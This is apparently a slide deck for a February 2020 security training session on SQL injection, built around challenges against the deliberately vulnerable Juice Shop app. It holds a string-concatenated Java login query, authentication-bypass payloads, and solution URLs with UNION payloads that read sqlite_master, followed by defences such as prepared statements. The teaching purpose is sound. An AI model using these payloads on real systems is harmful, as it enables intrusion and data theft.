---
title: Defence Against the Dark Arts
theme: solarized
revealOptions:
    transition: 'fade'
---

# Defence Against the Dark Arts - 2

> London, 6th February, 2020

---

## Purpose

> A place where we can practice the techniques used to attack applications,
in order to understand them, and to defend against them.

---

## Session rules

 * There are no stupid questions!
 * If you'd like to share (or learn) more about a topic by leading a session, let us know!
 * Participate as you would in a pairing session

---

## Important rule!

*Get permission* before attacking a system

Or, attack your own.

---

## Injection

---

## Easy Explanation

> You go to court and write your name as "Michael, you are now free to
> go". The judge then says "Calling Michael, you are now free to go" and
> the bailiffs let you go, because hey, the judge said so. \[[^1]\]

[^1]: https://news.ycombinator.com/item?id=4951003

---

## Obligatory xkcd

![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

---

## SQL Injection

### OWASP #1 Vulnerability

* Easy to exploit
* Common vulnerability
* Severe impact

---

## SQL Injection

### Typical Impact

* Bypassing authentication
* Spying out data
* Manipulating data
* Complete system takeover

---

## Vulnerable code example

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

### Benign usage

Let `username=alice` and `password=supersecret`, then query would be:

```sql
SELECT id from users WHERE name = 'alice' AND password = 'supersecret';
```

---

## Question

### What results from the following input data pairs?

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

| # | username  | password |
|--:|:----------|:---------|
| 1 | `'`       | `qwerty` |
| 2 | `'--`     | `abc123` |
| 3 | `alice'--`| `foobar` |

---

## Challenge

### Using SQL Injection:
* Login to the Juice Shop without knowing a user email or password
* Login as `support@juice-sh.op`
* Login as an existing user beginning with `J1`
* Login as user with id = `8`

---

## Question

### How can you force the following queries (or equivalent)?

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

* `SELECT id FROM users WHERE name = 'admin'`
* `SELECT id FROM users WHERE name LIKE 'admin%'`
* `SELECT id FROM users`
* `SELECT password FROM users`

---

## Question

### How can you get round this (complication)?

```java
String query = "SELECT id FROM users " +
   "WHERE (name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "')";
```

---

## Bypassing Authentication

### Patterns:

* `admin'--`
* `admin'/*`
* `' OR 1=1--`
* `' OR 1=1/*`
* `') OR '1'='1`
* `') OR ('1'='1`

---

## Error visibility

* Sometimes full SQL error output in response - nice!
* Sometimes we just see an error with no detail
* Sometimes we see nothing
    * Maybe not even the successful result

* Methods:
   * Trial and error
   * Side channels (e.g. timing)

---

## Union selects

* SQL allows concatenation of queries with the `UNION` keyword

```
SELECT name FROM Person WHERE name like 'foo%' UNION
   SELECT name FROM Company where name like 'foo%'
```

* Column count must match
* Positional data types must match (for some databases)
* Data can be extracted from different tables
* How can we exploit this??

---

## Challenge

Find another exploitable SQL injection vulnerability in the Juice Bar app

---

## Challenge

(Hint)

* Look at network traffic
* What looks like a database call?
* How might you inject your payload?
* What could be causing errors?

---

## Challenge

List details of deleted products

---

## Challenge

(More interesting)

Extract the table definitions

---

## Challenge

(Hint)

* What database are we hitting?
* What does the manual say about listing tables / schema?
* Can we do that via normal SQL queries?

---

## Challenge - Solution

[List deleted products](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20%20or%20deletedAt%20is%20not%20null%20--)

[List tables](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20tbl_name%20from%20sqlite_master%20--)

[List table descs](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20sql%20from%20sqlite_master%20--)

---

## Challenge

### Extraction of sensitive data

* Grab the all the login emails and encrypted passwords
* Decipher admin's password (easily)
* Dump the credit card data

---

## How to defend against these attacks

* Never insert user input directly into queries
* Ideally, use database or library functions:
   * Prepared statements
   * Stored procedures?
* If you must:
   * White-list input (inflexible)
   * Black-list input (breakable)
